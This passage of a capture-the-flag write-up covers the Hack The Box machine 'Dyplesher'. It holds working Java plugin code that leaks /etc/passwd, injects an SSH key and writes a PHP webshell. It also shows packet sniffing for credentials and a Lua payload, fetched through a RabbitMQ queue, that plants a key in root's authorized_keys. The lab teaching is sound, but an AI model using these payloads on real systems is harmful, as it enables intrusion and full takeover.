For testing purpose, we'll first the same code from the code:

```java
package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");
    }
    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
```
On right side of the screen there is a tab named `maven`, click on it to expand it's options. Under `Lifecycle` there is package option.

![maven](/assets/img/Posts/Dyplesher/maven.png)

Either right click on it and select run maven build or simple double click to build the package, on successful build inside target folder we should have a .jar file.

![1stb](/assets/img/Posts/Dyplesher/1stb.png)

#### Uploading Plugin

On selecting Add plugin option, we browse our jar file and hit add button, once uploaded we get a plugin uploaded successfully message.

![upload](/assets/img/Posts/Dyplesher/upload.png)

Even though our plugin is uploaded, We have nothing on console output.

If we go to Reload plugin option, type our plugin name which is `coldfx` as mentioned in plugin.yml and hit Load we get Plugin successfully loaded message.

![reload1](/assets/img/Posts/Dyplesher/reload1.png)

#### Console Output

Bingo! We have messages in console:

![msg](/assets/img/Posts/Dyplesher/msg.png)

## Shell as MinatoTW

### Info Leak Plugin

Now that we can write to the console, let's update our code inside `onEnable` function to leak contents of `/etc/passwd` file and also get the current username who is executing these commands.

```java
package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

//Reading /etc/password
        try {
            String currentLine;
            BufferedReader reader = new BufferedReader(new FileReader("/etc/passwd"));
            while ((currentLine = reader.readLine()) != null) {
                getLogger().info(currentLine);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
//Fetching Username
        getLogger().info(System.getProperty("user.name"));
    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
```
Next, I will update the .jar file version by editing `pom.xml`, Initially it was 1.0-SNAPSHOT, by changing the version detail newly build jar file named `cfx-1.0.jar` will be generated. Only reason I am doing this is to ensure the original jar file doesn't get replaced and I have older version in my archive as well.

```xml
<artifactId>cfx</artifactId>
    <version>1.0</version>
```

We'll Add this plugin and then load it again. There is content limit on number of lines held on the console, but we can see the users with their home directories like MinatoTW, felamos & yuntao.

Also, we can the see the current user executing these queries is `MinatoTW`

![console1](/assets/img/Posts/Dyplesher/console1.png)

### Shell access Plugin

Great! So if we can read files, maybe we can write them too. Having that thought in mind, I decided to inject a SSH key and also upload a PHP backdoor webshell just to be on safer side.

Generating a SSH key:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ssh-keygen -f coldfx
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in coldfx
Your public key has been saved in coldfx.pub
The key fingerprint is:
SHA256:0uJtShyP6MNjord3BqU15/6lpGRQu8vc7XbmloGahfI root@cfx
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|        .        |
|      +o..       |
|     +=+S  . .   |
|    o+ Oo.. o .  |
|   ...=.Bo.+.  o |
|  o.*.oB.=E+. =  |
|.o.=.=. =.+oo=.  |
+----[SHA256]-----+
```
Finally I'll update the code to Inject our Public SSH key inside `/home/MinatoTW/.ssh/authorized_keys` and write a PHP backdoor webshell `cfxshell.php` inside `/var/www/test/`.

```java
package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.FileWriter;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

//Injecting SSH Key
        try {
            FileWriter file_write = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
            file_write.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ4a0fk6x+IqUvSCbsXE6jiM2AMyA8rY+kLoG3ekOTrToramikOd174buxFYF5hpB0jVMN2URAVchcTL1VKpqdm0jssG5nsT69IWMyaOQ8RHb6Ew4pO77y3n1y43DRd1H2HQuZPSZyOpaewROc8F7LPIVXG4h5DMFT0ZL+MYNWD6IuNxBjfrgyz2WVskvXKwSRmq6L6kcwe+1a7XOrwkrpqzoPngtg9T9WP55rXt9Hzm+yDjYFO4VbE2R+L0vCg5UUZOXnjYBniot9w/jZyyOUuqjPG3/vldAtD11t9dbc89ZtOXT7GIzZEjYbCcul3HXhV4JY3SqvAkYB58imYnt8NsLSl2AwTjiIh7VFu6BIHLvNiEjwpMAxkMSj5cXjj2JcCHhGEPRxemRQmC9Wz9PzDEercJJwtQMCAf5vRE+VZnrwIhBHPznQ+7WVQJklI7ywbh9ljc5ZOz0Ba/RAi5AI8w7Lb2QjSP1po21TsBMgNXmhta0F3f+s= root@cfx");
            file_write.close();
            getLogger().info("SSH Key Injected Successfully");
        } catch (IOException e) {
                getLogger().info("Injection Failed");
            e.printStackTrace();
        }
//Writing WebShell
        try {
            FileWriter file_write = new FileWriter("/var/www/test/cfxshell.php");
            file_write.write("<?php system($_REQUEST['cfx']); ?>");
            file_write.close();
            getLogger().info("Written Webshell Successfully");
        } catch (IOException e) {
            getLogger().info("Couldn't write Webshell");
            e.printStackTrace();
        }

    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
```
Changing the version inside pom.xml to 2.0, Run Maven to build the package.

![intelli](/assets/img/Posts/Dyplesher/intelli.png)

Adding and reloading the plugin, we get the output on console:

![console2](/assets/img/Posts/Dyplesher/console2.png)

It appears, We successfully injected SSH key and even wrote a PHP backdoor.

### PHP Backdoor Webshell

Testing webshell we discover its working:

```console
cfx:  ~/Documents/htb/dyplesher
→ curl http://test.dyplesher.htb/cfxshell.php?cfx=id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

### SSH

Our Public SSH key is written to the home directory, and we can SSH as MinatoTW :

```shell
cfx:  ~/Documents/htb/dyplesher
→ chmod 600 coldfx

cfx:  ~/Documents/htb/dyplesher
→ ssh -i coldfx MinatoTW@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Oct 2020 05:46:20 PM UTC

  System load:  0.1               Processes:              248
  Usage of /:   6.9% of 97.93GB   Users logged in:        0
  Memory usage: 36%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 20 13:44:56 2020 from 10.10.14.4
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

## Elevating Priv: MinatoTW -> felamos

### Enumeration

Inside home directory we find three folders:

```shell
MinatoTW@dyplesher:~$ ls
backup  Cuberite  paper
```

`backup` folder consist of data of memcached service where we find contents of email, username and password discovered earlier.

`paper` directory contains the some updated data of git bundle we saw in `repo.zip`

```shell
MinatoTW@dyplesher:~/backup$ cat backup.sh
#!/bin/bash

memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm
memccp --servers 127.0.0.1 --username felamos --password zxcvbnm /home/MinatoTW/backup/*

MinatoTW@dyplesher:~/paper$ ls
banned-ips.json      bukkit.yml  commands.yml  help.yml  ops.json   paper.yml        plugins            spigot.yml  usercache.json        whitelist.json
banned-players.json  cache       eula.txt      logs      paper.jar  permissions.yml  server.properties  start.sh    version_history.json  world
```
Inside `Cuberite` folder we find data related to cuberite server.

> Cuberite is a Minecraft-compatible multiplayer game server that is written in C++ and designed to be efficient with memory and CPU, as well as having a flexible Lua Plugin API. Cuberite is compatible with the Java Edition Minecraft client.

```shell
MinatoTW@dyplesher:~/Cuberite$ ls
BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world
banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether
brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end
```
### Wireshark Group

What's interesting is that the user MinatoTW is a member of `wireshark` group, which is quite unusual:

```shell
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

Looking for files owned by this group, we find `dumpcap` is the only file owned by this group:

```shell
MinatoTW@dyplesher:~$ find / -group wireshark 2>/dev/null
/usr/bin/dumpcap
```
Binary `dumpcap` has SUDO capabilities which allows it to capture raw packets:

```shell
MinatoTW@dyplesher:~$ getcap /usr/bin/dumpcap
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
```
### Packet Capture

As there are multiple interfaces on the box, We'll first capture data over localhost using loopback interface and store the file inside /dev/shm/:

```shell
MinatoTW@dyplesher:~$ dumpcap -i lo -w /dev/shm/dump.pcapng
Capturing on 'Loopback: lo'
File: /dev/shm/dump.pcapng
Packets captured: 237
```

Next, I'll make use of `scp` to transfer the `pcapng` file to my machine for further analysis:

```shell
cfx:  ~/Documents/htb/dyplesher
→ scp -i coldfx MinatoTW@10.10.10.190:/dev/shm/dump.pcapng .
dump.pcapng                                                                                                                                                 100%   31KB  47.6KB/s   00:00
```
### Pcapng Analysis - Wireshark

While looking at file packet capture dump, we see lot's of packets over AMQP (Advanced Message Queuing Protocol), something which was also identified in nmap scan:

![capture](/assets/img/Posts/Dyplesher/capture.png)

Looking at the tcp stream of a packet, we discover additional credentials for users on this box :

- MinatoTW:bihys1amFov
- yuntao:wagthAw4ob
- felamos:tieb0graQueg

![capture1](/assets/img/Posts/Dyplesher/capture1.png)

### SSH - felamos

SSH creds for worked for both MinatoTW and yuntao but there's nothing interesting inside yuntao's directory.

With felamos creds `felamos:tieb0graQueg` we can either SSH or `su`:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ssh felamos@10.10.10.190
felamos@10.10.10.190's password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Oct 2020 06:32:58 PM UTC

  System load:  0.27              Processes:              241
  Usage of /:   6.7% of 97.93GB   Users logged in:        1
  Memory usage: 43%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
felamos@dyplesher:~$ id
uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
```
#### user.txt

```shell
felamos@dyplesher:~$ cat user.txt
bbc5b0e8aab3c8******************
```

## Elevating Priv: felamos -> root

### Enumeration

Inside home directory of felamos, we have a `yuntao` directory which is supposedly a note to yuntao.

```shell
felamos@dyplesher:~/yuntao$ cat send.sh
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

It appears we need to create a Cuberite plugin, publish the url containing plugin to Exchange & Queue which is RabbitMQ in AMQP.

### Attack Scenario

One Important thing to note is Cuberite plugins are written in Lua, and we can get code execution in Lua using command like `os.execute` which is similar to `os.system` like in Python.

Basically, We'll publish a message to RabbitMQ and inside the body will be our url to retrieve the cuberite plugin, However instead of a legit cuberite plugin, our url will point towards a malicious Lua script which will give us remote code execution.

### AMQP-Publish tool

To publish messages to RabbitMQ we'll use [**amqp-publish**](https://github.com/selency/amqp-publish) a small written in go used to publish messages to RabbitMQ from command line.

We'll download the latest binary from [**release**](https://github.com/selency/amqp-publish/releases/tag/v1.0.0) and save it to my htb directory.

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --help
Usage of ./amqp-publish.linux-amd64:
  -body string
        Message body
  -exchange string
        Exchange name
  -routing-key string
        Routing key. Use queue
        name with blank exchange to publish directly to queue.
  -uri string
        AMQP URI amqp://<user>:<password>@<host>:<port>/[vhost]
```
#### Testing the tool

For understanding tool's behaviour I tried to first send the command only with felamos's credential and default body, unfortunately we got a error:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://felamos:tieb0graQueg@10.10.10.190:5672/" --body="hello, world!"
exchange and routing-key cannot both be blank
```
It says we need a exchange and routing-key, as mentioned in the note `plugin_data "Exchange" and "Queue"` I decided to put `plugin_data` in both exchange and routing-key, but again we error on credentials :

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://felamos:tieb0graQueg@10.10.10.190:5672/" --exchange="plugin_data" --routing-key="plugin_data" --body="hello, world!"
Exception (403) Reason: "username or password not allowed"
```
I tried credentials for MinatoTW and yuntao we got earlier but nothing worked.

#### Back to Wireshark

I went back to Wireshark dump to check if I missed anything and noticed at the top these messages have been published by `yuntao` to RabbitMQ and the password used to authenticate is `EashAnicOc3Op`

![capture2](/assets/img/Posts/Dyplesher/capture2.png)

We have a new Credential - `yuntao:EashAnicOc3Op`

#### AMQP-publish with new creds

Trying with new creds, it appears it's running successfully as we didn't receive any error:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="plugin_data" --routing-key="plugin_data" --body="hello, world!"
```

#### RCE Test - Phase 1

Now, let's if we are having any remote code execution by sending a localhost url in the body:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="plugin_data" --routing-key="plugin_data" --body="http://127.0.0.1:8020"
```
Running a python server with felamos to check if we got any hit:

```shell
felamos@dyplesher:~/yuntao$ python3 -m http.server 8020
Serving HTTP on 0.0.0.0 port 8020 (http://0.0.0.0:8020/) ...

```
#### RCE Test - Phase 2

I was unsure what was happening, so I went back to the tool usage, In 2nd Usage it's mentioned if we keep exchange as blank, it directly published message to queue using RabbitMQ default exchange. I tried it this way and it worked !!

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:8020"
```

Python server hit:

```shell
felamos@dyplesher:~/yuntao$ python3 -m http.server 8020
Serving HTTP on 0.0.0.0 port 8020 (http://0.0.0.0:8020/) ...
127.0.0.1 - - [29/Oct/2020 19:34:01] "GET / HTTP/1.0" 200 -
```

#### Confirming RCE

Now, let's check if we can write anything to the server using this method, I created a Lua script which should create a file named `cfx` inside `/tmp/`

```shell
felamos@dyplesher:~/yuntao$ cat test.lua
os.execute("touch /tmp/cfx")
```
Sending the command from my machine:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:8020/test.lua"
```
Getting the hit on Python server:

```
felamos@dyplesher:~/yuntao$ python3 -m http.server 8020
Serving HTTP on 0.0.0.0 port 8020 (http://0.0.0.0:8020/) ...
127.0.0.1 - - [29/Oct/2020 19:40:41] "GET /test.lua HTTP/1.0" 200 -
```
Success !! File get's created inside `/tmp/` owned by root:

```shell
felamos@dyplesher:/tmp$ ls -la
-rw-r--r--  1 root     root        0 Oct 29 19:41 cfx
```

### Malicious Plugin - RCE

Now, that we have confirmed that our code execution is working, let's drop our SSH key to `/root/.ssh/authorized_keys` and get a root shell

#### cfx.lua Script:

```shell
felamos@dyplesher:/dev/shm$ cat cfx.lua
os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ4a0fk6x+IqUvSCbsXE6jiM2AMyA8rY+kLoG3ekOTrToramikOd174buxFYF5hpB0jVMN2URAVchcTL1VKpqdm0jssG5nsT69IWMyaOQ8RHb6Ew4pO77y3n1y43DRd1H2HQuZPSZyOpaewROc8F7LPIVXG4h5DMFT0ZL+MYNWD6IuNxBjfrgyz2WVskvXKwSRmq6L6kcwe+1a7XOrwkrpqzoPngtg9T9WP55rXt9Hzm+yDjYFO4VbE2R+L0vCg5UUZOXnjYBniot9w/jZyyOUuqjPG3/vldAtD11t9dbc89ZtOXT7GIzZEjYbCcul3HXhV4JY3SqvAkYB58imYnt8NsLSl2AwTjiIh7VFu6BIHLvNiEjwpMAxkMSj5cXjj2JcCHhGEPRxemRQmC9Wz9PzDEercJJwtQMCAf5vRE+VZnrwIhBHPznQ+7WVQJklI7ywbh9ljc5ZOz0Ba/RAi5AI8w7Lb2QjSP1po21TsBMgNXmhta0F3f+s= root@cfx' >> /root/.ssh/authorized_keys")

felamos@dyplesher:/dev/shm$ python3 -m http.server 8020
Serving HTTP on 0.0.0.0 port 8020 (http://0.0.0.0:8020/) ...
127.0.0.1 - - [29/Oct/2020 19:52:11] "GET /cfx.lua HTTP/1.0" 200 -
```
Publishing :

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:8020/cfx.lua"
```

### Shell as root

#### SSH access

Since, Our public key was written inside the home directory of root user, we can SSH as root using the Private key:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ssh -i coldfx root@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 29 Oct 2020 07:52:39 PM UTC

  System load:  0.0               Processes:              239
  Usage of /:   6.7% of 97.93GB   Users logged in:        1
  Memory usage: 35%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun May 24 03:33:34 2020
root@dyplesher:~# id
uid=0(root) gid=0(root) groups=0(root)
```
#### Grabbing root.txt

```shell
root@dyplesher:~# cat root.txt
f1f06c6366971dc*****************

```
And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
